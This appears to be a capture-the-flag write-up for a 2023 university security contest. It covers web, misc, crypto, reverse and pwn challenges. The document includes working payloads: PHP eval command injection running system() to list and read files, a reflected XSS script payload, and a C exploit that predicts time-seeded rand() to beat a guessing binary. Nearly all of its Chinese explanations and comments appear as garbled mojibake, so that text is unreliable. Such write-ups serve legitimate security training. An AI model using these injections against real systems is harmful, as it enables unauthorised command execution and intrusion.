## æ¯”èµ›åœ°å€
[XHUç½‘ç»œå®‰å…¨å®éªŒå®¤æ‹›æ–°èµ›(2023)](http://112.74.181.184/games/1)

## WEB
### ez_php
> è¿™æ®µPHPä»£ç æ˜¯ä¸€ä¸ªç®€å•çš„Webè„šæœ¬ï¼Œå…è®¸ç”¨æˆ·é€šè¿‡HTTP GETè¯·æ±‚ä¼ é€’ä¸€ä¸ªåä¸º "c" çš„å‚æ•°ï¼Œå¹¶å°†è¯¥å‚æ•°çš„å€¼ä¼ é€’ç»™ `eval()` å‡½æ•°æ‰§è¡Œ

```php
<?php
error_reporting(0);  // è®¾ç½®PHPé”™è¯¯æŠ¥å‘Šçº§åˆ«ä¸º0ï¼Œå³ä¸æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯

if(isset($_GET['c'])){ // å¦‚æœHTTP GETè¯·æ±‚ä¸­åŒ…å«å‚æ•° 'c'
    $c = $_GET['c'];   // è·å–å‚æ•° 'c' çš„å€¼
    eval($c);          // ä½¿ç”¨eval()å‡½æ•°æ‰§è¡Œå‚æ•° 'c' çš„å€¼ä½œä¸ºPHPä»£ç 
} else {
    highlight_file(__FILE__); // å¦‚æœæ²¡æœ‰å‚æ•° 'c'ï¼Œåˆ™æ˜¾ç¤ºå½“å‰è„šæœ¬æ–‡ä»¶çš„æºä»£ç 
}

```
> è¿™æ®µä»£ç çš„é—®é¢˜åœ¨äºï¼Œå®ƒå…è®¸ç”¨æˆ·è¾“å…¥ä»»æ„çš„PHPä»£ç å¹¶å°†å…¶ä½œä¸ºå‚æ•° 'c' çš„å€¼ä¼ é€’ç»™ `eval()` å‡½æ•°æ‰§è¡Œï¼Œè¿™å¯èƒ½å¯¼è‡´å®‰å…¨é£é™©ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
```php
?c=system('ls /');
bin boot dev etc fl4g_w4s_here home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var

?c=system('cat /fl4g_w4s_here');
covteam{welcome_to_covteam}
```
1.   åœ¨ PHP ä¸­ï¼Œ`system` æ˜¯ä¸€ä¸ªç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ã€‚å®ƒå…è®¸ä½ åœ¨ PHP è„šæœ¬ä¸­è°ƒç”¨æ“ä½œç³»ç»Ÿçº§åˆ«çš„å‘½ä»¤ï¼Œå¹¶ä¸”å¯ä»¥è·å–å‘½ä»¤çš„è¾“å‡ºã€‚`system` å‡½æ•°çš„åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š
2.  system(command, return_var);
	- `command` æ˜¯è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚
	- `return_var` æ˜¯ä¸€ä¸ªå¯é€‰å‚æ•°ï¼Œå®ƒå°†ç”¨äºå­˜å‚¨å‘½ä»¤çš„è¿”å›å€¼ã€‚å¦‚æœæä¾›äº†è¿™ä¸ªå‚æ•°ï¼Œå‘½ä»¤çš„è¿”å›å€¼å°†è¢«å­˜å‚¨åœ¨è¿™ä¸ªå˜é‡ä¸­
### ez_xss
app.js
> è¿™æ®µä»£ç æ˜¯ä¸€ä¸ªä½¿ç”¨ Node.js å’Œ Express æ¡†æ¶ç¼–å†™çš„ç®€å• Web åº”ç”¨ç¨‹åºã€‚ä¸‹é¢æ˜¯å¯¹ä»£ç çš„ä¸­æ–‡æ³¨é‡Šï¼š
```java
import express from "express"; // å¯¼å…¥ Express æ¡†æ¶
import { visit } from './bot.js'; // å¯¼å…¥ bot.js æ–‡ä»¶ä¸­çš„ visit å‡½æ•°
import bodyParser from "body-parser"; // å¯¼å…¥ body-parser æ¨¡å—ï¼Œç”¨äºè§£æè¯·æ±‚ä½“
const FLAG = process.env.FLAG || 'covteam{DUMMY}'; // ä»ç¯å¢ƒå˜é‡ä¸­è·å– FLAG æˆ–é»˜è®¤ä¸º 'covteam{DUMMY}'
const COOKIE = process.env.COOKIE || 'DUMMY'; // ä»ç¯å¢ƒå˜é‡ä¸­è·å– COOKIE æˆ–é»˜è®¤ä¸º 'DUMMY'
import cookieParser from "cookie-parser"; // å¯¼å…¥ cookie-parser æ¨¡å—ï¼Œç”¨äºè§£æ cookie

const app = express(); // åˆ›å»º Express åº”ç”¨ç¨‹åºå®ä¾‹
app.use(cookieParser()); // ä½¿ç”¨ cookie-parser ä¸­é—´ä»¶ï¼Œä»¥ä¾¿è§£æè¯·æ±‚ä¸­çš„ cookie
app.use(bodyParser.urlencoded({ extended: true })); // ä½¿ç”¨ body-parser ä¸­é—´ä»¶ï¼Œä»¥ä¾¿è§£æè¯·æ±‚ä½“ä¸­çš„è¡¨å•æ•°æ®

const port = 4242; // å®šä¹‰åº”ç”¨ç¨‹åºç›‘å¬çš„ç«¯å£å·

app.get('/', (req, res) => {
	var name = "xss"
	if (req.query.name) {
		name = req.query.name;
	}
	
	console.log(name)
	res.send(`<h1>Can you get FLAG? ${name}?</h1>`); // å¤„ç†æ ¹è·¯å¾„çš„ GET è¯·æ±‚ï¼Œæ ¹æ®æŸ¥è¯¢å‚æ•°æ˜¾ç¤ºæ¶ˆæ¯
});

app.get('/getflag', (req, res) => {
	var a = req.cookies.user;
	if (req.cookies.user == COOKIE) {
		res.send(`<script>alert("You are admin, here is FLAG: `+FLAG+`")</script>`); // å¦‚æœç”¨æˆ·çš„ cookie ä¸ç¯å¢ƒå˜é‡ä¸­çš„ COOKIE åŒ¹é…ï¼Œè¿”å›åŒ…å« FLAG çš„è„šæœ¬
	} else {
		res.status(400).send('Authentication failed'); // å¦åˆ™è¿”å›è®¤è¯å¤±è´¥çš„å“åº”
	}
});

app.post('/bot', (req, res) => {
	const uri = req.body.uri;
	visit(uri); // å¤„ç† /bot è·¯å¾„çš„ POST è¯·æ±‚ï¼Œè°ƒç”¨ bot.js ä¸­çš„ visit å‡½æ•°å¹¶ä¼ é€’ uri å‚æ•°
	res.send(""); // å‘é€ç©ºå“åº”
});

app.listen(port, () => console.log(`app listening on port ${port}!`)); // å¯åŠ¨ Express åº”ç”¨ç¨‹åºç›‘å¬æŒ‡å®šç«¯å£

```
>åœ¨æ ¹è·¯å¾„çš„GETè¯·æ±‚ä¸­ï¼Œç”¨æˆ·è¾“å…¥çš„`name`å‚æ•°è¢«ç›´æ¥æ’å…¥åˆ°HTMLå“åº”ä¸­ï¼Œè¿™å¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰æ¼æ´ã€‚å»ºè®®å¯¹`name`å‚æ•°è¿›è¡Œé€‚å½“çš„è¾“å…¥éªŒè¯å’Œç¼–ç ï¼Œä»¥é˜²æ­¢XSSæ”»å‡»ã€‚
```java
?name=<script>alert(1)</script>
```

### ez_front
æŸ¥çœ‹ç½‘é¡µæºä»£ç  ï¼Œçœ‹preload.js
```java
    let secert='covteam{y0u_kn0w_fr0n4_secu4ity}';
    let scoreret = `<h2 style = 'color:white; text-align:center; position:relative; top: 35%;'>Your Score : ${ scorePoint }</h2>`;
    if(scorePoint>=100){
        scoreret += `<h2 style = 'color:white; text-align:center; position:relative;'>${secert}</h2>`;
    }
```
å¤§äº100æ—¶ä¼šå¼¹å‡ºsecert= ä¹Ÿå°±æ˜¯flag

### front_fetch
åŒä¸Š
```java
 let scoreret = `<h2 style = 'color:white; text-align:center; position:relative; top: 35%;'>Your Score : ${ scorePoint }</h2>`;

    if(scorePoint>=100){

        code2 =  document.getElementById('code2').innerText;  // code2å…³æ³¨ â­

        let secert=fetch('http://101.43.112.74:18004/'+code1+code2+'.'+'thrid').then(response => response.text()).then(data => data_out=data);

        scoreret += `<h2 style = 'color:white; text-align:center; position:relative;'>${data_out}</h2>`;

    }
```
ä¸è¿‡ secretæ˜¯ `http://101.43.112.74:18004/'+code1+code2+'.'+'thrid' `çš„é¡µé¢å†…å®¹ ï¼Œæˆ‘ä»¬å»æ‰¾code1å’Œcode2å°±å¯ä»¥

æ§åˆ¶å°ç›´æ¥å¼¹å‡ºcode2ï¼Œç„¶åæ‹¼æ¥urlåœ°å€ï¼Œè®¿é—®å°±å¯ä»¥å¾—åˆ°secret
![](front_fetch.png)

### header
é‡å®šå‘æ¬¡æ•°å¤ªå¤šï¼ŒburpæŠ“åŒ…ä¸€æ­¥æ­¥çœ‹ï¼Œæç¤ºheaderï¼ˆæ³¨æ„å“åº”å¤´å’Œè¯·æ±‚å¤´â­ï¼‰
![](header.png)
![](header1.png)

### ez_java

## Misc

### å¦‚ä½•ç™»å½•githubï¼ŸğŸ¤”
å°±è¿›å» ï¼Œæ‰¾é‚£ä¸ªpyæ–‡ä»¶
![](github.png)
ç„¶åæŠŠåå­—ç”¨æ ¼å¼åŒ…è£¹ä½å°±å¯ä»¥äº†
`covteam{convert.py}`

## Crypto
### md5
å°±æ‰¾ä¸ªcmd5ç½‘ç«™è§£å¯†
![](MD5.png)

## Reverse
### baby_upx
```bash
63 6F 76 74 65 61 6D 7B 54 68 69 73 5F 69 73 5F 63 6F 64 65 5F 52 65 7D
```
- asciiç è½¬æ¢ä¸ºå­—ç¬¦
![](re.png)

### baby_Re

## Pwn

### baby_numbergame
1. ä¸‹è½½é™„ä»¶ï¼Œæ‹–è¿›IDAä¸­ï¼ŒF5æŸ¥çœ‹ä¼ªä»£ç 
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // å®šä¹‰æ•´æ•°å˜é‡ v4ï¼Œç”¨äºå­˜å‚¨ç”¨æˆ·é€‰æ‹©çš„é—¨ç¼–å·
  unsigned __int64 v5; // å®šä¹‰æ— ç¬¦å·æ•´æ•°å˜é‡ v5ï¼Œé€šå¸¸ç”¨äºä¿å­˜æŸäº›ç¨‹åºçŠ¶æ€ä¿¡æ¯

  v5 = __readfsqword(0x28u); // ä¿å­˜ç¨‹åºçŠ¶æ€ä¿¡æ¯

  v4 = 0; // åˆå§‹åŒ– v4 ä¸º 0ï¼Œç”¨äºåç»­å­˜å‚¨ç”¨æˆ·çš„é€‰æ‹©

  // è¾“å‡ºæ¸¸æˆçš„æ¬¢è¿ä¿¡æ¯å’Œé€‰é¡¹
  puts("[+]Let's play a number game, choice one door ,then guess my random number!");
  puts("[+]1.doorOne:Hard?   2.doorTwo:Easy?   3.doorThree:Simple?");
  printf("Input your choice:"); // æç¤ºç”¨æˆ·è¾“å…¥é€‰æ‹©

  // ä»ç”¨æˆ·è¾“å…¥ä¸­è¯»å–é€‰æ‹©å¹¶å­˜å‚¨åˆ° v4 ä¸­
  __isoc99_scanf("%d", &v4);

  // æ ¹æ®ç”¨æˆ·çš„é€‰æ‹©æ‰§è¡Œç›¸åº”çš„å‡½æ•°
  switch (v4)
  {
    case 1:
      door1(); // æ‰§è¡Œ door1 å‡½æ•°ï¼Œå¯èƒ½æ˜¯æ¸¸æˆä¸­çš„éš¾åº¦ä¹‹ä¸€
      break;
    case 2:
      door2(); // æ‰§è¡Œ door2 å‡½æ•°ï¼Œå¯èƒ½æ˜¯æ¸¸æˆä¸­çš„éš¾åº¦ä¹‹ä¸€
      break;
    case 3:
      door3(); // æ‰§è¡Œ door3 å‡½æ•°ï¼Œå¯èƒ½æ˜¯æ¸¸æˆä¸­çš„éš¾åº¦ä¹‹ä¸€
      break;
  }

  return 0; // è¿”å› 0 è¡¨ç¤ºç¨‹åºæ­£å¸¸ç»“æŸ
}

```
2.éšä¾¿è·Ÿè¿›ä¸€ä¸ªdoor
```c
unsigned __int64 door3()
{
  unsigned int v0; // å®šä¹‰æ— ç¬¦å·æ•´æ•°å˜é‡ v0
  int v2; // å®šä¹‰æ•´æ•°å˜é‡ v2ï¼Œç”¨äºå­˜å‚¨ç”¨æˆ·çš„çŒœæµ‹
  int v3; // å®šä¹‰æ•´æ•°å˜é‡ v3ï¼Œç”¨äºè®¡æ•°
  int i; // å®šä¹‰æ•´æ•°å˜é‡ iï¼Œç”¨äºå¾ªç¯è®¡æ•°
  unsigned int v5; // å®šä¹‰æ— ç¬¦å·æ•´æ•°å˜é‡ v5ï¼Œç”¨äºå­˜å‚¨éšæœºç”Ÿæˆçš„æ•°å­—
  unsigned __int64 v6; // å®šä¹‰æ— ç¬¦å·é•¿æ•´æ•°å˜é‡ v6ï¼Œé€šå¸¸ç”¨äºä¿å­˜ç¨‹åºçŠ¶æ€ä¿¡æ¯

  v6 = __readfsqword(0x28u); // ä¿å­˜ç¨‹åºçŠ¶æ€ä¿¡æ¯

  // è¾“å‡ºæ¸¸æˆä¿¡æ¯ï¼Œæç¤ºç”¨æˆ·æœ‰åæ¬¡æœºä¼šæ¥çŒœæ•°å­—
  puts("[!]doorThree:Are you sure? You have ten times to try!");

  v5 = 0; // åˆå§‹åŒ– v5 ä¸º 0ï¼Œç”¨äºå­˜å‚¨éšæœºç”Ÿæˆçš„æ•°å­—
  v2 = 0; // åˆå§‹åŒ– v2 ä¸º 0ï¼Œç”¨äºå­˜å‚¨ç”¨æˆ·çš„çŒœæµ‹
  v3 = 0; // åˆå§‹åŒ– v3 ä¸º 0ï¼Œç”¨äºè®¡æ•°

  for (i = 0; i <= 9; ++i) // å¾ªç¯è¿›è¡ŒçŒœæ•°å­—çš„æ“ä½œï¼Œæœ€å¤šåæ¬¡
  {
    v0 = time(0LL); // è·å–å½“å‰æ—¶é—´
    srand(v0); // ä½¿ç”¨æ—¶é—´ä½œä¸ºéšæœºæ•°ç§å­
    v5 = rand() % 1000; // ç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œå–ä½™ 1000ï¼ŒèŒƒå›´åœ¨ 0 åˆ° 999 ä¹‹é—´
    printf("[+]guess what I think, hengheng~~~:"); // æç¤ºç”¨æˆ·çŒœæµ‹
    __isoc99_scanf("%d", &v2); // ä»ç”¨æˆ·è¾“å…¥ä¸­è¯»å–çŒœæµ‹å¹¶å­˜å‚¨åˆ° v2 ä¸­

    if (v5 == v2) // åˆ¤æ–­ç”¨æˆ·çš„çŒœæµ‹æ˜¯å¦ä¸éšæœºæ•°ç›¸ç­‰
    {
      puts("you get it! Let's get ready to be a real pwn master!!");
      system("cat flag"); // å¦‚æœçŒœå¯¹äº†ï¼Œæ‰§è¡Œä¸€ä¸ªå‘½ä»¤æ¥è·å–æ ‡å¿—ï¼ˆflagï¼‰
      return v6 - __readfsqword(0x28u); // è¿”å›ç¨‹åºçŠ¶æ€ä¿¡æ¯
    }
    
    printf("[!]enen, nono~, the number in my mind is %d, try again!\n", v5); // å¦‚æœçŒœé”™ï¼Œæç¤ºç”¨æˆ·å†æ¬¡å°è¯•çŒœæµ‹
    
    if (++v3 == 5) // å¦‚æœç”¨æˆ·è¿ç»­çŒœé”™äº† 5 æ¬¡
      puts("[!]Dawn!!!!! bro!M3"); // è¾“å‡ºè­¦å‘Šæ¶ˆæ¯
  }

  return v6 - __readfsqword(0x28u); // è¿”å›ç¨‹åºçŠ¶æ€ä¿¡æ¯
}

```
3. ç†è§£ç¨‹åºï¼Œå†™expï¼ˆè¿›å…¥3é—¨åï¼Œè·å–æ—¶é—´ï¼Œåšä¼ªéšæœºæ•°ï¼ŒçŒœæ•°ï¼‰
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

int main() {
    // ä½¿ç”¨ç›¸åŒçš„ç§å­ç”Ÿæˆéšæœºæ•°
    time_t seed = time(NULL);
    srand((unsigned int)seed);
    int predicted_random_number = rand() % 1000;

    // å¯åŠ¨ç¨‹åºå¹¶ä¸å…¶è¿›è¡Œäº¤äº’
    FILE* program = popen("./pwn1", "w");

    // å‘é€é—¨3çš„é€‰æ‹©
    fprintf(program, "3\n");
    fflush(program);

    // ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œå¦‚æœç¨‹åºè¦æ±‚ç­‰å¾…2ç§’
    sleep(2);
    printf("%d\n", predicted_random_number);

    // å‘é€é¢„æµ‹çš„ç­”æ¡ˆç»™ç¨‹åº
    fprintf(program, "%d\n", predicted_random_number);
    fflush(program);

    // è¯»å–ç¨‹åºçš„å“åº”
    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), program) != NULL) {
        printf("%s", buffer);
        if (strstr(buffer, "you get it!") != NULL) {
            pclose(program);
            return 0; // åœæ­¢ç¨‹åº
        }
    }

    pclose(program);

    return 0;
}

```
4. gcc 1.cpp ï¼Œè¿è¡Œ
![](pwn1.png)
>å…³é”®é—®é¢˜æ˜¯ç¨‹åºä½¿ç”¨äº† `rand` æ¥ç”Ÿæˆä¼ªéšæœºæ•°ï¼Œä½†å®ƒåœ¨æ¯æ¬¡å¾ªç¯ä¸­éƒ½ä½¿ç”¨ç›¸åŒçš„ç§å­ï¼Œè¿™æ„å‘³ç€ç”Ÿæˆçš„ä¼ªéšæœºæ•°æ˜¯ç›¸åŒçš„ã€‚è¿™æ„å‘³ç€åªè¦åœ¨å¾ªç¯å¼€å§‹ä¹‹å‰çŸ¥é“äº†ç¬¬ä¸€ä¸ªéšæœºæ•°ï¼Œå°±å¯ä»¥åœ¨æ•´ä¸ªæ¸¸æˆä¸­é¢„æµ‹æ¯æ¬¡çš„éšæœºæ•°ï¼Œä»è€Œè½»æ¾è·å–flagã€‚
>è§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ³•æ˜¯é€šè¿‡ç ´è§£ä¼ªéšæœºæ•°ç”Ÿæˆï¼Œä»¥é¢„æµ‹æ¯æ¬¡çš„éšæœºæ•°ï¼Œä»è€Œåœ¨ç¬¬ä¸€æ¬¡çŒœæµ‹æ—¶è·å–flagã€‚è¿™é€šå¸¸æ¶‰åŠåˆ°åˆ†æ `rand` å‡½æ•°çš„ç§å­ç”Ÿæˆå’Œéšæœºæ•°ç”Ÿæˆç®—æ³•ï¼Œç„¶åç¼–å†™ä»£ç æ¥æ¨¡æ‹Ÿè¿™ä¸ªè¿‡ç¨‹ä»¥è·å–æ­£ç¡®çš„éšæœºæ•°ã€‚